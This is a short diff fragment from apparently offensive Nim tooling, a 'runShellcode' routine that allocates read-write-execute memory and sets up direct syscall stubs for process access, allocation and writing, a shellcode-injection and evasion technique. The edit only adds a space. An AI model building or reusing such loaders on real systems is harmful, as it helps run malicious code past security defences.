@@ -141,7 +141,7 @@ proc runShellcode(shellcode: seq[byte]): void =
     let cProcess = GetCurrentProcessId()
     var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cProcess)
 
-    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2, NULL,cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
 
     var syscallStub_NtAlloc:  HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
     var syscallStub_NtWrite:  HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
